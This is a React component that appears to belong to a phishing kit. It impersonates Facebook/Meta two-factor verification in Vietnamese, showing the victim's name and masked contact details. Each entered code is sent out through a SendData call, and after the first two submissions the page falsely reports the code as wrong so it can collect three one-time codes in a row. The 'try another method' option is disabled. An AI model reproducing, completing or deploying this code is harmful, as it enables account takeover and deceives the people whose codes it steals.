import React from 'react';
import Modal from './Modal';
import { maskEmail, maskPhoneNumber } from '@/utils/mask';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);
    const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email } = formDataState as FormData || {};

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email);

    const [countdown, setCountdown] = React.useState<number>(initialCountdown);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
        setTwoFa(normalizedValue);
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change

        if (click === 0) {
            dispatch(updateForm({ twoFa: normalizedValue }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: normalizedValue }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: normalizedValue }));
        }
    };

    const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

    const formatRetryError = (secondsLeft: number) => {
        const minutes = Math.floor(secondsLeft / 60);
        const seconds = secondsLeft % 60;
        return `Mã xác thực bạn nhập chưa chính xác. Vui lòng thử lại sau ${minutes} phút ${seconds} giây.`;
    };

    const startRetryCountdown = (nextStep: number) => {
        if (intervalRef.current) clearInterval(intervalRef.current);

        setDisable(true);
        setCountdown(initialCountdown);
        setErrors({ twoFa: formatRetryError(initialCountdown) });

        intervalRef.current = setInterval(() => {
            setCountdown((prev) => {
                const next = prev - 1;
                if (next <= 0) {
                    if (intervalRef.current) clearInterval(intervalRef.current);
                    intervalRef.current = null;
                    setClick(nextStep);
                    setErrors({});
                    setDisable(false);
                    return initialCountdown;
                }
                setErrors({ twoFa: formatRetryError(next) });
                return next;
            });
        }, 1000);
    };

    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8);
        e.preventDefault();
        setTwoFa(pasted);
        setErrors((prev) => ({ ...prev, twoFa: '' }));
        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
    };

    const handleClose = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

            if (!isTwoFaValid) {
                setErrors({ twoFa: 'Vui lòng nhập mã 2FA hợp lệ gồm 6 hoặc 8 chữ số.' });
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(1);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(2);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: 'Không thể gửi mã xác thực. Vui lòng thử lại sau.' });
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        isOpendFinish(true);
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: 'Không thể xác minh mã 2FA. Vui lòng thử lại.' });
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <div className='w-full'>
                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                        <span>{fullName}</span>
                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                        <span>Facebook</span>
                    </div>
                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Yêu cầu xác thực hai yếu tố (Bước {click + 1}/3)</h2>
                    <p className='text-[#9a979e] text-[14px]'>Nhập mã cho tài khoản này được gửi đến {emailDisplay}, {phoneDisplay} hoặc xác nhận bằng ứng dụng xác thực bạn đã thiết lập (như Duo Mobile hoặc Google Authenticator).</p>
                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                    </div>
                    <div className='w-full'>
                        <form onSubmit={handSubmit}>
                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Mã 2FA <span className='text-[#e5484d]'>*</span></label>
                            <div className={`${inputClass('twoFa')}`} >
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    id="twoFa"
                                    placeholder="Nhập mã xác thực"
                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    onPaste={handlePaste}
                                    disabled={disabled}
                                    maxLength={8}
                                    aria-label='Mã xác thực hai yếu tố'
                                />
                            </div>
                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>Mã hợp lệ gồm 6 hoặc 8 chữ số.</p>
                            {errorText('twoFa')}

                            <div className='w-full mt-[20px]'>
                                <button
                                    className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                    disabled={disabled || !isTwoFaValid}
                                    aria-label='Tiếp tục xác thực'
                                >
                                    {loading && (
                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                        </div>
                                    )}
                                    {loading ? '' : 'Tiếp tục'}
                                </button>
                            </div>

                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] pointer-events-none'>
                                <span>Thử phương thức khác</span>
                            </div>
                        </form>
                    </div>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto pt-8'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;